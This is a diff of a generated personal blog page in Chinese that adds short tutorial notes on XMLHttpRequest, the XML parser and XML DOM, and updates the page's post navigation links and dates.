+<li>在后台向服务器发送数据</li>
+</ul>
+<h4 id="语法"><a href="#语法" class="headerlink" title="语法:"></a>语法:</h4><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">xmlhttp=new XMLHttpRequest(); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h2 id="XML-Parser-解析器"><a href="#XML-Parser-解析器" class="headerlink" title="XML Parser(解析器)"></a>XML Parser(解析器)</h2><p>XML 解析器把 XML 文档转换为 XML DOM 对象 - 可通过 JavaScript 操作的对象。</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/xml/xml-parser.html">菜鸟教程</a></p>
+<h2 id="Xml-DoM"><a href="#Xml-DoM" class="headerlink" title="Xml DoM"></a>Xml DoM</h2><p>DOM（Document Object Model 文档对象模型）定义了访问和操作文档(xml)的标准方法。</p>
 
                 
             </div>
@@ -613,7 +631,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://echo-machile.github.io/2021/05/07/23942.html">http://echo-machile.github.io/2021/05/07/23942.html</a>
+                    <a href="http://echo-machile.github.io/2021/05/09/23955.html">http://echo-machile.github.io/2021/05/09/23955.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -824,9 +842,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/05/09/23955.html">
                     <div class="card-image">
@@ -844,9 +863,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-09
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-09
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -855,6 +874,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -873,13 +893,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/05/03/23950.html">
+                <a href="/2021/05/07/23942.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="Docker详解">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="BUUCTF做题笔记">
                         
-                        <span class="card-title">Docker详解</span>
+                        <span class="card-title">BUUCTF做题笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -890,7 +910,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-07
                             </span>
                         <span class="publish-author">
                             
